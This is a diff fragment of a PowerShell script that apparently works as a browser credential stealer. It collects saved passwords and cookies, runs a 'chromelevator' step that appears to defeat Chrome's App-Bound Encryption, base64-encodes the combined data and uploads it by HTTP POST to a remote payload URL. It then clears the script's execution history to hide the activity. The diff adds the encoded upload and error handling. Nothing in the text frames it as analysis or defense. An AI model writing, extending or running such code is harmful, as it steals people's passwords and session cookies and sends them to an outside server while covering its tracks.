-Write-Host "[DEBUG] cookieCount=$($payloadObject.cookieCount)"
-Write-Host "[DEBUG] payloadPasswordType=$(if ($null -eq $payloadObject.passwords) { 'null' } else { $payloadObject.passwords.GetType().FullName })"
-$dpapiDecrypted = @($payloadObject.passwords | Where-Object { $_.password -and $_.password -ne "" -and $_.password -notmatch "App-Bound Encryption" }).Count
-Write-Host "[DEBUG] v10_v11.decryptedCount=$dpapiDecrypted"
 
-Write-DebugStage "Invoke-ChromelevatorExtraction"
+Write-DebugStep "Running chromelevator (UseChromelevator=$UseChromelevator)"
 $chromelevatorMeta = Invoke-ChromelevatorExtraction -Payload $payloadObject -ApiBase $ApiBase
-Write-Host "[DEBUG] chromelevatorMetaType=$($chromelevatorMeta.GetType().FullName)"
-if ($chromelevatorMeta -is [System.Array]) {
-    Write-Host "[DEBUG] chromelevatorMeta arrayCount=$($chromelevatorMeta.Count)"
-}
 $payloadObject | Add-Member -NotePropertyName chromelevator -NotePropertyValue ([pscustomobject]$chromelevatorMeta) -Force
-$abeDecrypted = @($payloadObject.passwords | Where-Object { $_.password_dpapi -and $_.password_dpapi -ne "" }).Count
-Write-Host "[DEBUG] password_dpapi.decryptedCount=$abeDecrypted"
+Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), passwords=$($chromelevatorMeta.abeMergedCount), cookies=$($chromelevatorMeta.cookiesMergedCount))"
 
-$payloadJson = $payloadObject | ConvertTo-Json -Depth 10
+Write-DebugStep "Serializing payload"
+$payloadJson = ConvertTo-JsonUnlimited -InputObject $payloadObject
+Write-DebugStep "Serialization completed (jsonLength=$($payloadJson.Length))"
 
-Write-Host "[DEBUG] Sending payload to API..."
-$response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $payloadJson
-$response | ConvertTo-Json -Compress
+Write-DebugStep "Uploading payload to $PayloadUrl"
+$payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson))
+Write-DebugStep "Base64 encoded (length=$($payloadB64.Length))"
+$null = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $payloadB64
+Write-DebugStep "Payload upload completed"
+}
+catch {
+    Write-DebugError $_
+    $script:ExitCode = Get-ErrorCodeFromException $_
+    Write-Host $script:ExitCode
 }
 finally {
     Clear-ScriptExecutionHistory
+    if ($CloseTerminal) {
+        if ($null -ne $script:ExitCode) {
+            exit $script:ExitCode
+        }
+        exit
+    }
 }
